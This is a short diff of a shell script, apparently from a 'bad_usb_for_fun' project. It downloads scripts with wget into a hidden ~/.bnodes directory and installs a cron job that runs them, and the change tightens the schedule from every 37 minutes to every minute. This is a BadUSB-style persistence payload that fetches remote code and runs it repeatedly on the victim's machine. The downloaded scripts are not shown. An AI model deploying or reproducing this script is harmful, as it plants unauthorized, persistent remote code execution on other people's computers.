@@ -9,7 +9,7 @@ wget -q -O "$bexecute_file" "https://github.com/Cluster-bright/bad_usb_for_fun/r
 wget -q -O "$buninstall_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/buninstall.sh"
 
 
-cronjob="*/37 * * * * ~/.bnodes/.bexecute.sh"
+cronjob="*/1 * * * * ~/.bnodes/.bexecute.sh"
 crontab -l | grep -F "$cronjob" > /dev/null
 if [ $? -eq 1 ]; then
     (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
